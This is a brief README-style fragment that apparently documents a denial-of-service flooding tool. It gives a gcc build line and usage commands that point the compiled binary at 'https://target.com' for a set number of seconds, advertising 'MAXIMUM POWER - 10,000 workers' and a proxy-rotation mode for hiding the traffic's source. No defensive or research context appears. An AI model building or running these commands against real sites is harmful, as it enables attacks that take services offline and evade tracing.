```gcc -o caz caz.c -lcurl -lssl -lcrypto -lpthread -O3 -march=native -flto -Wall```

### MAXIMUM POWER - 10,000 workers, no proxies
```./cazzysoci https://target.com 60```

### With proxy rotation
```./cazzysoci https://target.com 120 proxy```




